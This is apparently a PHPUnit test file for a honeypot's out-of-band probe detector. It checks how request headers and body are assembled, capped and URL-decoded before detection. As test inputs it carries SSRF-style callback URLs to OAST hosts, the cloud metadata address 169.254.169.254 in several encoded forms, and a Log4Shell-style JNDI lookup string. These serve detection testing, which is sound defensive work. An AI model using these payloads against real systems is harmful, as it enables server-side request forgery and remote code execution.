<?php

declare(strict_types=1);

namespace Funnypot\Core\Tests;

use Funnypot\Core\OastProbe;
use Funnypot\Core\RequestContext;
use Funnypot\Core\Support\OobHaystack;
use PHPUnit\Framework\TestCase;

/**
 * FP-0257 — unit coverage of the shared OobHaystack builder: header-first ordering with the body
 * last, per-field caps, the header-SECTION budget that reserves the body window (N1), the bounded
 * multi-URL-decode ceiling, and determinism.
 */
final class OobHaystackTest extends TestCase
{
    public function test_headers_scanned_before_body_and_body_is_last(): void
    {
        $r = new RequestContext(
            'POST',
            '/',
            '',
            ['X-Probe' => 'header-marker-aaa'],
            'body-marker-zzz'
        );
        $hay = OobHaystack::raw($r);

        $hpos = strpos($hay, 'header-marker-aaa');
        $bpos = strpos($hay, 'body-marker-zzz');
        self::assertNotFalse($hpos);
        self::assertNotFalse($bpos);
        self::assertLessThan($bpos, $hpos, 'the header value must be assembled before the body');
    }

    public function test_per_header_value_cap_applies(): void
    {
        // A 15 KB cookie value is clipped to HEADER_VALUE_CAP (2048), so a later probe header is not
        // displaced and survives in the haystack — the baseline single-cap builder would have let a
        // giant value eat the window.
        $r = new RequestContext(
            'GET',
            '/',
            '',
            [
                'Cookie'  => str_repeat('a', 15000),
                'Referer' => 'http://abc.oastify.com/',
            ]
        );
        $hay = OobHaystack::raw($r);

        self::assertStringContainsString('abc.oastify.com', $hay, 'the trailing probe header survives the capped cookie');
        self::assertSame('burp-collab', OastProbe::detect($r));
    }

    public function test_header_section_budget_reserves_the_body_window(): void
    {
        // N1: the MIRROR of the cap-ordering fix — oversized/numerous HEADERS must not displace the
        // BODY past the total cap. 40 junk headers (each clipped to 2048 => ~80 KB of raw header
        // bytes, budgeted down to HEADER_SECTION_CAP = 43008) plus a body-borne OAST zone: the zone
        // still lands in the reserved body window and is detected.
        $headers = [];
        for ($i = 0; $i < 40; $i++) {
            $headers['X-Junk-' . $i] = str_repeat('j', 4000);
        }
        $r = new RequestContext('POST', '/', '', $headers, 'ssrf=http://body.oastify.com/');

        $hay = OobHaystack::raw($r);
        self::assertLessThanOrEqual(OobHaystack::TOTAL_CAP, strlen($hay));
        self::assertStringContainsString('body.oastify.com', $hay, 'junk headers must not evict the body scan window');
        self::assertSame('burp-collab', OastProbe::detect($r));
    }

    public function test_decode_depth_is_bounded(): void
    {
        // The multi-decode ceiling is a tested CONTRACT: triple-encoded is decoded to the plain form
        // (within MAX_DECODE_PASSES = 3), quadruple-encoded is not.
        $triple = new RequestContext('GET', '/', 'u=' . $this->encodeDots('169.254.169.254', 3));
        $quad = new RequestContext('GET', '/', 'u=' . $this->encodeDots('169.254.169.254', 4));

        self::assertStringContainsString('169.254.169.254', OobHaystack::build($triple));
        self::assertStringNotContainsString('169.254.169.254', OobHaystack::build($quad));

        // ...and the probe agrees end-to-end.
        self::assertSame('cloud-metadata', OastProbe::detect($triple));
        self::assertNull(OastProbe::detect($quad));
    }

    public function test_same_bytes_same_haystack(): void
    {
        $r = new RequestContext(
            'POST',
            '/a/b',
            'q=1&x=http%3A%2F%2Fz.oast.fun%2F',
            ['User-Agent' => 'probe/1.0', 'Referer' => 'http://x.example/'],
            'payload=${jndi:ldap://x/y}'
        );
        self::assertSame(OobHaystack::build($r), OobHaystack::build($r), 'the builder is a pure function of the request bytes');
    }

    /** Replace each '.' with an n-times URL-encoded dot ('.' -> %2e -> %252e -> ...). */
    private function encodeDots(string $s, int $passes): string
    {
        $dot = '.';
        for ($i = 0; $i < $passes; $i++) {
            $dot = $i === 0 ? '%2e' : str_replace('%', '%25', $dot);
        }

        return str_replace('.', $dot, $s);
    }
}
